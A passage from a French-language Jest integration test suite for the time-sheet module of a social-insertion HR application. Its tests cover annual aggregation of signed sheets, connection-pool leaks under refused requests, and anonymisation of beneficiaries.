  // ═════════════════════════════════════════════════════════════════════════
  // 5. Agrégat annuel
  // ═════════════════════════════════════════════════════════════════════════
  describe('agrégat annuel (indicateur n° 14)', () => {
    beforeAll(async () => {
      // On refige la feuille du MANAGER, puis on ajoute un fait POSTÉRIEUR au
      // gel : l'agrégat doit relire la feuille SIGNÉE, pas la recomposer.
      await auth(request(app).post(url(U.INTERV.id, '/valider')), 'INTERV');
      await poserEntretien(sAsi, U.INTERV.id, `${ANNEE}-${M}-26`, 300);
    });

    test('la synthèse relit les mois FIGÉS et concorde avec les feuilles signées', async () => {
      const r = await auth(request(app).get(`/api/insertion/temps/synthese?annee=${ANNEE}`), 'ADMIN');
      expect(r.status).toBe(200);
      const mgr = r.body.par_intervenant.find((i) => i.user_id === U.INTERV.id);
      // 255 min figées : les 300 min ajoutées après la signature ne comptent pas.
      expect(mgr.minutes).toBe(255);
      const feuille = await auth(request(app).get(url(U.INTERV.id)), 'ADMIN');
      expect(feuille.body.totaux.total_minutes).toBe(mgr.minutes);
    });

    test('la ventilation par projet et par salarié est cohérente', async () => {
      const r = await auth(request(app).get(`/api/insertion/temps/synthese?annee=${ANNEE}`), 'ADMIN');
      const asi = r.body.par_projet.find((p) => p.code === CODES[0]);
      expect(asi.taux_forfaitaire_pct).toBe(40);
      expect(r.body.par_salarie.some((s) => s.employee_id === sAsi)).toBe(true);
      expect(r.body.nb_salaries_concernes).toBeGreaterThanOrEqual(2);
      expect(r.body.moyenne_minutes_par_salarie).toBeGreaterThan(0);
      expect(r.body.global_minutes).toBeGreaterThanOrEqual(255);
    });

    // ⚠ SONDE — la promesse du module est que « l'agrégat annoncé au dialogue de
    // gestion et les feuilles signées ne peuvent pas se contredire »
    // (temps-accompagnement.js, en-tête de `heuresAccompagnement`). L'ensemble
    // des intervenants est pourtant construit à partir des faits VIVANTS : une
    // feuille signée dont le fait d'origine a été supprimé depuis sort donc du
    // calcul, alors qu'elle continue d'exister et d'être opposable.
    test('SONDE — une feuille SIGNÉE dont le fait d\'origine a disparu reste-t-elle comptée ?', async () => {
      const { heuresAccompagnement } = require('../../src/services/temps-accompagnement');
      const fig = await pool.query(
        'SELECT totaux FROM insertion_feuilles_temps WHERE user_id = $1 AND annee = $2 AND mois = $3',
        [U.RH.id, ANNEE, MOIS]);
      const totalSigne = fig.rows[0].totaux.total_minutes;
      expect(totalSigne).toBe(90);

      const avant = await heuresAccompagnement({ annee: ANNEE });
      expect(avant.par_intervenant.find((i) => i.user_id === U.RH.id).minutes).toBe(90);

      // Le seul fait vivant de cette feuille est supprimé (correction tardive).
      const sup = await pool.query(
        `DELETE FROM insertion_milestones WHERE interviewer_id = $1 AND completed_date = $2::date RETURNING id`,
        [U.RH.id, `${ANNEE}-${M}-13`]);
      expect(sup.rows.length).toBe(1);
      try {
        const apres = await heuresAccompagnement({ annee: ANNEE });
        const rh = apres.par_intervenant.find((i) => i.user_id === U.RH.id);
        // La feuille signée dit 90 minutes : l'agrégat doit dire la même chose.
        expect(rh).toBeTruthy();
        expect(rh.minutes).toBe(totalSigne);
      } finally {
        await poserEntretien(sAsi, U.RH.id, `${ANNEE}-${M}-13`, 90);
      }
    });

    test('une année sans aucune ligne rend 0 minute mais une moyenne NULL', async () => {
      const { heuresAccompagnement } = require('../../src/services/temps-accompagnement');
      const vide = await heuresAccompagnement({ annee: 2001 });
      expect(vide.global_minutes).toBe(0);
      expect(vide.nb_salaries_concernes).toBe(0);
      // « Aucune personne accompagnée » ne se divise pas : null, jamais 0.
      expect(vide.moyenne_minutes_par_salarie).toBeNull();
    });

    test('gatherAuditKpis expose `heures_accompagnement`, et null sur une année vide', async () => {
      const { gatherAuditKpis } = require('../../src/routes/insertion/routes');
      const k = await gatherAuditKpis(ANNEE);
      expect(k).toHaveProperty('heures_accompagnement');
      expect(k.heures_accompagnement).not.toBeNull();
      expect(k.heures_accompagnement.global_minutes).toBeGreaterThanOrEqual(255);
      const vide = await gatherAuditKpis(2001);
      expect(vide.heures_accompagnement.global_minutes).toBe(0);
      expect(vide.heures_accompagnement.moyenne_minutes_par_salarie).toBeNull();
    });
  });

  // ═════════════════════════════════════════════════════════════════════════
  // 6. Fuites du pool
  // ═════════════════════════════════════════════════════════════════════════
  describe('gestion des connexions', () => {
    test('une rafale de 20 refus 4xx (dont des refus TRANSACTIONNELS) ne retient aucune connexion', async () => {
      await auth(request(app).get(url(U.INTERV.id)), 'ADMIN');
      await new Promise((r) => setTimeout(r, 150));
      const avant = etatPool(pool);
      for (let i = 0; i < 20; i += 1) {
        // 403 (périmètre), 409 (feuille figée), 409 (transition invalide —
        // celui-ci passe par `pool.connect()` et sort par un ROLLBACK), 409
        // (export vide), 400 (motif manquant, sur un chemin transactionnel).
        await auth(request(app).get(url(U.RH.id)), 'MANAGER');
        await auth(request(app).post(url(U.INTERV.id, '/saisies')), 'ADMIN')
          .send({ date: `${ANNEE}-${M}-25`, activite: 'autre', duree_minutes: 30 });
        await auth(request(app).post(url(U.INTERV.id, '/valider')), 'ADMIN');
        await auth(request(app).get(`/api/insertion/temps/${U.ADMIN.id}/${ANNEE}/2/export.csv`), 'ADMIN');
        await auth(request(app).post(url(U.INTERV.id, '/rouvrir')), 'ADMIN').send({});
      }
      await new Promise((r) => setTimeout(r, 300));
      const apres = etatPool(pool);
      expect(apres.waiting).toBe(0);
      expect(apres.total - apres.idle).toBeLessThanOrEqual(Math.max(0, avant.total - avant.idle));
    });
  });

  // ═════════════════════════════════════════════════════════════════════════
  // 7. Anonymisation d'un bénéficiaire
  // ═════════════════════════════════════════════════════════════════════════
  describe('anonymisation', () => {
    test('l\'identifiant du salarié disparaît du snapshot, le volume d\'heures reste', async () => {
      const avant = await pool.query(
        'SELECT lignes, totaux FROM insertion_feuilles_temps WHERE user_id = $1 AND annee = $2 AND mois = $3',
        [U.INTERV.id, ANNEE, MOIS]);
      const lignesAvant = avant.rows[0].lignes || [];
      expect(lignesAvant.some((l) => Number(l.employee_id) === sAsi)).toBe(true);
      const totalAvant = avant.rows[0].totaux.total_minutes;

      const { anonymizeEmployee } = require('../../src/services/anonymization');
      const client = await pool.connect();
      try {
        await client.query('BEGIN');
        await anonymizeEmployee(client, sAsi);
        await client.query('COMMIT');
      } finally { client.release(); }

      const apres = await pool.query(
        'SELECT lignes, totaux FROM insertion_feuilles_temps WHERE user_id = $1 AND annee = $2 AND mois = $3',
        [U.INTERV.id, ANNEE, MOIS]);
      const lignesApres = apres.rows[0].lignes;
      // Le lien nominatif disparaît…
      expect(lignesApres.some((l) => Number(l.employee_id) === sAsi)).toBe(false);
      expect(lignesApres.filter((l) => l.employee_id === null).length).toBeGreaterThanOrEqual(1);
      // …et la pièce de financement reste entière : même nombre de lignes,
      // mêmes durées, même total. C'est ce que le financeur contrôle.
      expect(lignesApres.length).toBe(lignesAvant.length);
      expect(apres.rows[0].totaux.total_minutes).toBe(totalAvant);
      expect(lignesApres.map((l) => l.duree_minutes)).toEqual(lignesAvant.map((l) => l.duree_minutes));
    });
  });
});
